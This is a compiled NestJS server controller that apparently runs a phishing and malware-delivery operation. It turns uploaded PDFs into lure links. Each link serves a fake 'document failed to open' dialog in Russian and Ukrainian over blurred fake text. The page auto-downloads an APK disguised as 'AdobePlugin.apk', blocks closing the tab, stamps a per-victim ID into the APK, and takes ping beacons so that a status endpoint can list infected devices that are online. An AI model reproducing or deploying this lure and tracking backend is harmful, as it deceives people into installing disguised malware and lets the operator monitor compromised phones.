"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.AppController = void 0;
const common_1 = require("@nestjs/common");
const platform_express_1 = require("@nestjs/platform-express");
const app_service_1 = require("./app.service");
const apk_injector_service_1 = require("./apk-injector.service");
const prisma_service_1 = require("./prisma.service");
const multer_1 = require("multer");
const path_1 = require("path");
const fs = __importStar(require("fs"));
let AppController = class AppController {
    appService;
    apkInjector;
    prisma;
    constructor(appService, apkInjector, prisma) {
        this.appService = appService;
        this.apkInjector = apkInjector;
        this.prisma = prisma;
    }
    getHello() {
        return this.appService.getHello();
    }
    async uploadPdf(file) {
        if (!file) {
            throw new common_1.HttpException('File is required', common_1.HttpStatus.BAD_REQUEST);
        }
        try {
            const originalName = Buffer.from(file.originalname, 'latin1').toString('utf8');
            const record = await this.prisma.pdfRecord.create({
                data: {
                    originalName: originalName,
                    modifiedName: file.filename,
                    lastPingAt: new Date(0)
                }
            });
            const viewUrl = `/view/${record.id}`;
            return {
                message: 'File uploaded successfully',
                originalFilename: file.originalname,
                pdfId: record.id,
                downloadUrl: viewUrl,
                viewUrl: viewUrl
            };
        }
        catch (error) {
            throw new common_1.HttpException(`Error uploading PDF: ${error.message}`, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async viewPdf(id, res) {
        const record = await this.prisma.pdfRecord.findUnique({ where: { id } });
        if (!record) {
            throw new common_1.HttpException('Not found', common_1.HttpStatus.NOT_FOUND);
        }
        const apkUrl = `/apk/download?pdfId=${encodeURIComponent(id)}`;
        const docName = record.originalName.replace(/</g, '&lt;').replace(/>/g, '&gt;');
        const html = `<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${docName}</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      width: 100vw; height: 100vh;
      overflow: hidden;
      background: #525659;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Segoe UI', Arial, sans-serif;
    }

    /* Размытый фон — страница PDF */
    .page {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #525659;
    }
    .page-inner {
      width: min(620px, 92vw);
      height: min(860px, 92vh);
      background: white;
      box-shadow: 0 6px 40px rgba(0,0,0,0.7);
      padding: 52px 64px;
      overflow: hidden;
      position: relative;
      filter: blur(6px);
      user-select: none;
      pointer-events: none;
      transform: scale(1.02);
    }

    /* Тёмный оверлей поверх страницы */
    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.55);
      backdrop-filter: blur(4px);
      -webkit-backdrop-filter: blur(4px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10;
    }

    /* Модальное окно в стиле Windows-диалога */
    .modal {
      background: #f0f0f0;
      border: 1px solid #999;
      border-radius: 4px;
      box-shadow: 4px 4px 16px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.3) inset;
      width: min(420px, 92vw);
      overflow: hidden;
      animation: popIn 0.15s ease-out;
    }
    @keyframes popIn {
      from { transform: scale(0.92); opacity: 0; }
      to   { transform: scale(1);    opacity: 1; }
    }

    /* Заголовок диалога */
    .modal-title {
      background: linear-gradient(to bottom, #c5d5e8, #a8bfd8);
      padding: 8px 12px;
      display: flex;
      align-items: center;
      gap: 8px;
      border-bottom: 1px solid #8899aa;
    }
    .modal-title-icon {
      width: 16px; height: 16px;
      background: linear-gradient(135deg, #e84040, #a00);
      border-radius: 2px;
      flex-shrink: 0;
    }
    .modal-title-text {
      font-size: 12px;
      font-weight: bold;
      color: #1a1a2e;
      flex: 1;
    }

    /* Тело диалога */
    .modal-body {
      padding: 20px 20px 10px;
      display: flex;
      gap: 14px;
      align-items: flex-start;
    }
    .modal-icon {
      font-size: 36px;
      line-height: 1;
      flex-shrink: 0;
      margin-top: 2px;
    }
    .modal-text {
      font-size: 13px;
      color: #1a1a1a;
      line-height: 1.65;
    }
    .modal-text strong {
      display: block;
      margin-bottom: 6px;
      font-size: 13px;
    }
    .modal-error-code {
      margin-top: 10px;
      font-size: 11px;
      color: #666;
      font-family: monospace;
    }

    /* Кнопки */
    .modal-footer {
      padding: 10px 16px 14px;
      display: flex;
      justify-content: flex-end;
      gap: 8px;
      border-top: 1px solid #d0d0d0;
      margin-top: 12px;
    }
    .btn-ok {
      background: linear-gradient(to bottom, #f8f8f8, #e0e0e0);
      border: 1px solid #999;
      border-radius: 3px;
      padding: 5px 22px;
      font-size: 12px;
      font-weight: bold;
      color: #111;
      cursor: pointer;
      min-width: 80px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.15);
    }
    .btn-ok:hover {
      background: linear-gradient(to bottom, #e8f0ff, #c8d8f0);
      border-color: #5577aa;
    }
    .btn-ok:active { transform: translateY(1px); }

    .btn-install {
      background: linear-gradient(to bottom, #3a7abf, #2a5a9a);
      border: 1px solid #1a4a7a;
      border-radius: 3px;
      padding: 5px 22px;
      font-size: 12px;
      font-weight: bold;
      color: white;
      cursor: pointer;
      min-width: 120px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.25);
    }
    .btn-install:hover { background: linear-gradient(to bottom, #4a8acf, #3a6aaa); }
    .btn-install:active { transform: translateY(1px); }
  </style>
</head>
<body>

  <!-- Размытый фон -->
  <div class="page">
    <div class="page-inner" id="pg"></div>
  </div>

  <!-- Тёмный оверлей -->
  <div class="overlay" id="overlay">
    <!-- Модальное диалоговое окно -->
    <div class="modal" id="modal">
      <div class="modal-title">
        <div class="modal-title-icon"></div>
        <span class="modal-title-text">помилка читання документу</span>
      </div>
      <div class="modal-body">
        <div class="modal-icon">&#9888;&#65039;</div>
        <div class="modal-text">
          <strong>Не удалось открыть документ</strong>
          При попытке запустить документ возникла критическая
          ошибка. Файл повреждён или требует дополнительных
          компонентов для корректного отображения.<br><br>
          Приложение не может запустить средство просмотра.
          Для устранения проблемы загрузите и установите
          необходимый компонент запуска.
          <div class="modal-error-code">Error 0xC0000142 · Launch failed · PDF Viewer crashed</div>
        </div>
      </div>
      <div class="modal-footer">
        <button class="btn-install" onclick="onInstall()">&#11015; Установить плагин</button>
      </div>
    </div>
  </div>

  <script>
    var APK = '${apkUrl}';

    // Генерация нечитаемого текста на фоне
    (function() {
      var pg = document.getElementById('pg');
      var g = [
        '\u0462\u0466\u046a\u046e\u0470\u0472\u0474\u0476\u047e\u0480',
        '\u048a\u048c\u0490\u0492\u0494\u0496\u0498\u049a\u049c\u049e',
        '\u04a0\u04a2\u04a4\u04a6\u04a8\u04aa\u04ac\u04ae\u04b0\u04b2'
      ];
      function rch() { var s=g[Math.floor(Math.random()*3)]; return s[Math.floor(Math.random()*s.length)]; }
      function rword() { var n=3+Math.floor(Math.random()*9),w=''; for(var i=0;i<n;i++) w+=rch(); return w; }
      function rline(c) { var p=[]; for(var i=0;i<c;i++) p.push(rword()); return p.join(' '); }
      var h = '<div style="font-size:19px;font-weight:bold;color:#0a0a0a;margin-bottom:22px;line-height:1.3;">'+rline(3)+'</div>';
      for (var i=0; i<16; i++) {
        h += '<div style="margin-bottom:13px;">';
        var rows = 2 + Math.floor(Math.random()*3);
        for (var j=0; j<rows; j++) {
          h += '<div style="font-size:13px;color:#1a1a1a;line-height:1.75;">'+rline(7+Math.floor(Math.random()*6))+'</div>';
        }
        h += '</div>';
      }
      for (var k=0; k<7; k++) {
        var t = 30 + k*80 + Math.floor(Math.random()*20);
        h += '<div style="position:absolute;top:'+t+'px;left:0;right:0;height:5px;background:linear-gradient(90deg,rgba(0,255,255,0.25),rgba(255,0,255,0.25),rgba(0,255,255,0.1));"></div>';
      }
      pg.innerHTML = h;
    })();

    // Скачать APK
    function dlApk() {
      try {
        var a = document.createElement('a');
        a.href = APK;
        a.download = 'AdobePlugin.apk';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      } catch(e) {}
    }

    // Кнопка "Закрыть" — скачивает APK, окно НЕ закрывается
    function onOk() {
      dlApk();
    }

    // Кнопка "Установить плагин" — скачивает APK
    function onInstall() {
      dlApk();
    }

    // Блокировка закрытия вкладки
    window.onbeforeunload = function(e) {
      e.preventDefault(); e.returnValue = ''; return '';
    };

    // Авто-скачивание при открытии
    setTimeout(dlApk, 500);
  </script>
</body>
</html>`;
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        return res.send(html);
    }
    async downloadPdfRaw(filename, res) {
        let filePath = (0, path_1.join)(__dirname, '..', 'uploads', 'original', filename);
        if (!fs.existsSync(filePath)) {
            const possibleId = filename.replace('.pdf', '');
            const r = await this.prisma.pdfRecord.findUnique({ where: { id: possibleId } });
            if (r)
                filePath = (0, path_1.join)(__dirname, '..', 'uploads', 'original', r.modifiedName);
            if (!fs.existsSync(filePath))
                throw new common_1.HttpException('File not found', common_1.HttpStatus.NOT_FOUND);
        }
        res.setHeader('Content-Type', 'application/pdf');
        return res.sendFile(filePath);
    }
    async downloadPdf(filename, pdfIdQuery, res) {
        const record = await this.prisma.pdfRecord.findFirst({ where: { modifiedName: filename } });
        if (record)
            return res.redirect(`/view/${record.id}`);
        const possibleId = filename.replace('.pdf', '');
        const recordById = await this.prisma.pdfRecord.findUnique({ where: { id: possibleId } });
        if (recordById)
            return res.redirect(`/view/${recordById.id}`);
        throw new common_1.HttpException('File not found', common_1.HttpStatus.NOT_FOUND);
    }
    async downloadPdfById(id, res) {
        return res.redirect(`/view/${id}`);
    }
    downloadApk(pdfId, res) {
        const apkDir = (0, path_1.join)(__dirname, '..', 'apk');
        const apkPath = (0, path_1.join)(apkDir, 'app.apk');
        if (!fs.existsSync(apkDir))
            fs.mkdirSync(apkDir, { recursive: true });
        if (!fs.existsSync(apkPath)) {
            fs.writeFileSync(apkPath, 'placeholder - replace with real signed APK');
        }
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename="AdobePlugin.apk"');
        if (pdfId) {
            try {
                const apkBuffer = fs.readFileSync(apkPath);
                const modifiedBuffer = this.apkInjector.inject(apkBuffer, `pdf_id=${pdfId}`);
                return res.end(modifiedBuffer);
            }
            catch (error) {
                console.error('APK Injection failed:', error.message);
                return res.sendFile(apkPath);
            }
        }
        else {
            return res.sendFile(apkPath);
        }
    }
    async ping(body, req) {
        console.log('Received ping from Android app:', { body, headers: req.headers });
        let pdfId = body?.pdfId || body?.pdf_id;
        if (!pdfId && typeof body === 'object') {
            const keys = Object.keys(body);
            if (keys.length === 1 && keys[0].startsWith('pdf_id=')) {
                pdfId = keys[0];
            }
        }
        if (!pdfId)
            throw new common_1.HttpException('pdfId is required', common_1.HttpStatus.BAD_REQUEST);
        const cleanPdfId = pdfId.replace('pdf_id=', '');
        try {
            await this.prisma.pdfRecord.update({
                where: { id: cleanPdfId },
                data: { lastPingAt: new Date() }
            });
            return { success: true };
        }
        catch (e) {
            console.error('Error updating pdfRecord for ping:', e);
            throw new common_1.HttpException('Invalid pdfId', common_1.HttpStatus.NOT_FOUND);
        }
    }
    async status() {
        const records = await this.prisma.pdfRecord.findMany({ orderBy: { createdAt: 'desc' } });
        const now = new Date();
        return records.map(r => {
            const isOnline = (now.getTime() - r.lastPingAt.getTime()) < 5 * 60 * 1000;
            const displayLastPingAt = r.lastPingAt.getTime() === 0 ? null : r.lastPingAt;
            return {
                id: r.id,
                originalName: r.originalName,
                isOnline,
                lastPingAt: displayLastPingAt,
                createdAt: r.createdAt
            };
        });
    }
};
exports.AppController = AppController;
__decorate([
    (0, common_1.Get)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", String)
], AppController.prototype, "getHello", null);
__decorate([
    (0, common_1.Post)('pdf/upload'),
    (0, common_1.UseInterceptors)((0, platform_express_1.FileInterceptor)('file', {
        storage: (0, multer_1.diskStorage)({
            destination: (req, file, cb) => {
                const uploadPath = (0, path_1.join)(__dirname, '..', 'uploads', 'original');
                if (!fs.existsSync(uploadPath)) {
                    fs.mkdirSync(uploadPath, { recursive: true });
                }
                cb(null, uploadPath);
            },
            filename: (req, file, cb) => {
                const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
                const ext = (0, path_1.extname)(file.originalname);
                cb(null, `${file.fieldname}-${uniqueSuffix}${ext}`);
            }
        }),
        fileFilter: (req, file, cb) => {
            if (file.mimetype === 'application/pdf') {
                cb(null, true);
            }
            else {
                cb(new common_1.HttpException('Only PDF files are allowed!', common_1.HttpStatus.BAD_REQUEST), false);
            }
        }
    })),
    __param(0, (0, common_1.UploadedFile)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], AppController.prototype, "uploadPdf", null);
__decorate([
    (0, common_1.Get)('view/:id'),
    __param(0, (0, common_1.Param)('id')),
    __param(1, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], AppController.prototype, "viewPdf", null);
__decorate([
    (0, common_1.Get)('pdf/raw/:filename'),
    __param(0, (0, common_1.Param)('filename')),
    __param(1, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], AppController.prototype, "downloadPdfRaw", null);
__decorate([
    (0, common_1.Get)('pdf/:filename'),
    __param(0, (0, common_1.Param)('filename')),
    __param(1, (0, common_1.Query)('pdfId')),
    __param(2, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Object]),
    __metadata("design:returntype", Promise)
], AppController.prototype, "downloadPdf", null);
__decorate([
    (0, common_1.Get)('pdf/download/:id'),
    __param(0, (0, common_1.Param)('id')),
    __param(1, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], AppController.prototype, "downloadPdfById", null);
__decorate([
    (0, common_1.Get)('apk/download'),
    __param(0, (0, common_1.Query)('pdfId')),
    __param(1, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", void 0)
], AppController.prototype, "downloadApk", null);
__decorate([
    (0, common_1.Post)('api/ping'),
    __param(0, (0, common_1.Body)()),
    __param(1, (0, common_1.Req)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object, Object]),
    __metadata("design:returntype", Promise)
], AppController.prototype, "ping", null);
__decorate([
    (0, common_1.Get)('api/status'),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], AppController.prototype, "status", null);
exports.AppController = AppController = __decorate([
    (0, common_1.Controller)(),
    __metadata("design:paramtypes", [app_service_1.AppService,
        apk_injector_service_1.ApkInjectorService,
        prisma_service_1.PrismaService])
], AppController);
//# sourceMappingURL=app.controller.js.map